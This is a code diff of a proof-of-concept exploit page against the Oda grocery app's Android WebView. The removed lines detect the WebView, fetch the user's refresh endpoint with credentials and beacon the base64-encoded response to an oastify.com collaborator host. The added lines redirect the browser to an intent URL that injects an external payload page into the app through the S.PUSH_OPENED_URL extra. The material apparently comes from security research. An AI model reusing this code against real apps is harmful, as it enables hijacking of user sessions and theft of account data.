@@ -1,50 +1,7 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Oda WebView Exploit</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-</head>
-<body>
-
-<h2>Loading...</h2>
-
-<a id="openApp" href="https://oda.com/no-en/account/climate/">
-    Click here if not redirected
-</a>
-
 <script>
-(function() {
-    const COLLAB = "https://86capcxbggebspel6y19s9pgw722qwel.oastify.com";
+   // Automatic redirect to trigger the app and inject the payload URL
+   var payloadUrl = "https://st-mudo.github.io/webview-poc/trigger_bridge.html";
+   var intent = "intent://oda.com/no-en/#Intent;scheme=https;package=no.kolonial.tienda;S.PUSH_OPENED_URL=" + payloadUrl + ";end";
 
-    function send(type, data) {
-        new Image().src = COLLAB + "/?" + type + "=" + encodeURIComponent(data);
-    }
-
-    send("log", "PAGE_LOADED");
-
-    if (navigator.userAgent.includes("wv")) {
-        send("log", "INSIDE_WEBVIEW");
-
-        // EXPLOIT
-        fetch("/api/v1/user/refresh/", {
-            credentials: "include"
-        })
-        .then(r => r.text())
-        .then(d => {
-            send("data", btoa(d));
-        })
-        .catch(e => send("error", e));
-
-    } else {
-        send("log", "OPENED_IN_BROWSER");
-
-        // 🔥 AUTO REDIRECT (HTTPS, bukan intent)
-        setTimeout(() => {
-            window.location.href = "https://oda.com/no-en/account/climate/";
-        }, 1500);
-    }
-})();
+   window.location.href = intent;
 </script>
-
-</body>
-</html>
